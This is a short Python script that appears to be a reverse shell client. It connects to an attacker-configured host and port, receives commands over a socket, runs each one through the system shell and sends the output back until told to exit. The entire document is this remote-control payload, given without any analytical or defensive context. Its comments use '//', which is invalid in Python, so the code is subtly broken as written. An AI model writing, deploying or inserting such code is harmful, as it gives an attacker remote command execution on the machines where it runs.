import socket
import subprocess

SERVER_HOST = "0.0.0.0" // Change this
SERVER_PORT = 6969 	// Change this
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
msg = "Connected!\n\n"
s.send(msg.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    if output == "":
        output = "Done"
    s.send(output.encode())
s.close()